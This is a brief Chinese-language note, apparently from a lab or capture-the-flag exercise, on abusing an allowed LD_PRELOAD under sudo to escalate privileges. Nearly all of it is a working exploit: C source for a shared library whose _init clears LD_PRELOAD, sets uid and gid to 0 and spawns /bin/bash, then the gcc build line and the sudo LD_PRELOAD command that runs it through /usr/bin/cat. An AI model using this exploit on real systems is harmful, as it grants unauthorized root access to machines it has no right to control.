给出了LD_PRELOAD，尝试用这个漏洞进行提权

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

void _init(){
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash");
}


cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles

sudo LD_PRELOAD=/tmp/pe.so  /usr/bin/cat /tmp/pe.c
